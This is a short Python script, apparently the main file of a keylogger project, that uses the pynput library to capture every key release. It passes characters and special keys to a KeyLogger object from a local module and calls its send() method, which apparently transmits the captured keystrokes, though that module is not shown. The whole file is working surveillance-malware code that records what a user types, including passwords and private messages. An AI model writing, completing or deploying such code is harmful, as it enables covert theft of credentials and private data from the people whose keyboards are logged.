# -*- coding: latin-1 -*-
from pynput.keyboard import Key
from pynput.keyboard import Listener
from modules import KeyLogger

key_logger = KeyLogger()


def on_release(key):
    if hasattr(key, 'char'):
        key_logger.append_char(key)
    elif key == Key.space:
        key_logger.append_char(' ')
    else:
        key_logger.append_key(key)
        key_logger.send()
    if key == Key.esc:
        return False


if __name__ == '__main__':
    # Collect events until released
    with Listener(on_release=on_release) as listener:
        listener.join()
